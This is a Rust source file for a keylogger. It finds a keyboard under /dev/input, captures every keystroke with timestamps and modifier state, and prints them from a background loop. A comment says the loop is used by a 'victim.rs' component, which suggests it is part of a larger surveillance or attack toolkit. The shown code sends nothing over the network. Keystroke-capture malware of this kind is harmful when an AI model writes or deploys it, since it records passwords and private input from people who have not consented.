use evdev::{Device, EventSummary, KeyCode}; // Removed unused RelativeAxisCode, BusType
use std::fs;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Instant;
use std::io::{self, Write};

#[derive(Default, Debug)]
struct Modifiers {
    shift: bool,
    ctrl: bool,
    alt: bool,
    meta: bool,
    capslock: bool,
}

impl Modifiers {
    fn update(&mut self, key: KeyCode, value: i32) {
        let pressed = value == 1;
        match key {
            KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
            KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
            KeyCode::KEY_LEFTALT | KeyCode::KEY_RIGHTALT => self.alt = pressed,
            KeyCode::KEY_LEFTMETA | KeyCode::KEY_RIGHTMETA => self.meta = pressed,
            KeyCode::KEY_CAPSLOCK if pressed => self.capslock = !self.capslock,
            _ => {}
        }
    }

    fn display(&self) -> String {
        let mut parts = Vec::new();
        if self.shift { parts.push("SHIFT"); }
        if self.ctrl { parts.push("CTRL"); }
        if self.alt { parts.push("ALT"); }
        if self.meta { parts.push("META"); }
        if self.capslock { parts.push("CAPS"); }

        if parts.is_empty() { "none".to_string() } else { parts.join(" ") }
    }
}

fn find_keyboard() -> io::Result<(Device, String)> {
    let mut candidates = Vec::new();
    for entry in fs::read_dir("/dev/input")? {
        let path = entry?.path();
        if !path.to_string_lossy().contains("event") { continue; }
        if let Ok(device) = Device::open(&path) {
            let Some(keys) = device.supported_keys() else { continue; };
            if keys.contains(KeyCode::KEY_A) && keys.contains(KeyCode::KEY_ENTER) {
                candidates.push((device, path.to_string_lossy().to_string()));
            }
        }
    }
    candidates.pop().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No keyboard found"))
}

fn parallels_remap(key: KeyCode) -> KeyCode {
    match key {
        KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
        KeyCode::KEY_RIGHTMETA => KeyCode::KEY_RIGHTALT,
        KeyCode::KEY_LEFTALT => KeyCode::KEY_LEFTMETA,
        KeyCode::KEY_RIGHTALT => KeyCode::KEY_RIGHTMETA,
        _ => key,
    }
}

/// Core background loop used by victim.rs
pub fn run_with_flag(running: Arc<AtomicBool>) -> io::Result<()> {
    let (mut device, path) = find_keyboard()?;
    println!("[*] Keylogger background thread started on: {}", path);
    
    let start_time = Instant::now();
    let mut modifiers = Modifiers::default();
    let mut printed_since_syn = false;

    while running.load(Ordering::SeqCst) {
        for ev in device.fetch_events()? {
            let rel = start_time.elapsed();
            let rel_str = format!("+{:>3}.{:06}", rel.as_secs(), rel.subsec_micros());

            match ev.destructure() {
                EventSummary::Key(_, raw_key, value) => {
                    let key = parallels_remap(raw_key);
                    let value_str = match value {
                        0 => "RELEASE",
                        1 => "PRESS",
                        2 => "REPEAT",
                        _ => "UNKNOWN",
                    };

                    println!("{:<15} {:<10} {:<20} {:<10} [{}]",
                        rel_str, "EV_KEY", format!("{:?}", key), value_str, modifiers.display()
                    );
                    io::stdout().flush().ok(); 

                    modifiers.update(key, value);
                    printed_since_syn = true;
                }
                EventSummary::Synchronization(..) if printed_since_syn => {
                    printed_since_syn = false;
                }
                _ => {}
            }
            if !running.load(Ordering::SeqCst) { break; }
        }
    }
    println!("[*] Keylogger stopping.");
    Ok(())
}

/// Standalone entry point
pub fn run() -> io::Result<()> {
    println!("=== Standalone Keylogger Mode ===");
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl+C handler");

    run_with_flag(running)
}

fn main() -> io::Result<()> {
    run()
}
